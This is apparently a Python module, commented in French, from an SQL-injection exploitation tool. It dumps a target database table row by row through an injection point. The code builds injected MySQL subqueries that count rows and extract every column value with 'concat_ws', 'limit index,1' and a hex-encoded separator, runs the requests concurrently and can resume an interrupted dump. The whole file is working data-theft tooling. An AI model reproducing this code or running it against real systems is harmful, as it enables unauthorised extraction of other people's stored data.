from __future__ import annotations

import asyncio
from collections.abc import Callable

from engine.exploit.reader import ValueReader
from engine.tamper.tampers import hexify

# Séparateur peu susceptible d'apparaître dans les données réelles.
ROW_SEP = "|~q~|"


async def count_rows(reader: ValueReader, db: str, table: str) -> int:
    raw = await reader.read(f"(select count(*) from {db}.{table})")
    return int(raw) if raw.strip().isdigit() else 0


async def dump_rows(
    reader: ValueReader,
    db: str,
    table: str,
    columns: list[str],
    *,
    concurrency: int = 5,
    start: int = 0,
    on_row: Callable[[int, dict[str, str]], None] | None = None,
) -> list[dict[str, str]]:
    """Dump concurrent des lignes. `start` permet la reprise ; `on_row` est appelé au fil
    de l'eau (checkpoint côté appelant). Renvoie les lignes dans l'ordre."""
    total = await count_rows(reader, db, table)
    if total == 0:
        return []

    rows: list[dict[str, str] | None] = [None] * total
    sem = asyncio.Semaphore(concurrency)
    cols_expr = ",".join(f"ifnull({c},0x20)" for c in columns)

    async def fetch(index: int) -> None:
        async with sem:
            expr = (
                f"(select concat_ws({hexify(ROW_SEP)},{cols_expr}) "
                f"from {db}.{table} limit {index},1)"
            )
            raw = await reader.read(expr)
            row = dict(zip(columns, raw.split(ROW_SEP), strict=False))
            rows[index] = row
            if on_row is not None:
                on_row(index, row)

    await asyncio.gather(*(fetch(i) for i in range(start, total)))
    return [r for r in rows if r is not None]
